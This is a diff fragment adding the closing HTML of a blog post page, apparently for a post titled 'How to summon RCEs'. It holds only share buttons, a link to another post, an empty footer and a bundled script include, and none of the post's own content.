+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=How%20to%20summon%20RCEs%20%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f&amp;t=How%20to%20summon%20RCEs" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=How%20to%20summon%20RCEs&amp;url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2021/06/approaching-windows/">
+                    <span class="button__text">Approaching Windows</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
